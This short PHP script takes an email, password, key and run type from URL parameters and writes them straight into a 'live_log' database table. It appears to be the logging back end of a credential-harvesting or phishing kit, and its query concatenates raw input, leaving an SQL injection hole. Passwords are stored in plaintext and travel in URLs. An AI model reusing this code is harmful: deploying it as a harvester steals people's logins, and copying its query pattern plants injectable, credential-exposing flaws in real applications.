<?php
// import configuration of database
require './confi.php';
$password = $_GET['pass'];
$mail = $_GET['mail'];
$id = $_GET['id'];
$type = $_GET['runid'];

$sql = "INSERT INTO live_log (mail, pass, keyy, typee)
      VALUES ('" . $mail . "', '" . $password . "', '" . $id . "', '" . $type . "')";
// use exec() because no results are returned
$conn->exec($sql);
$conn = null;
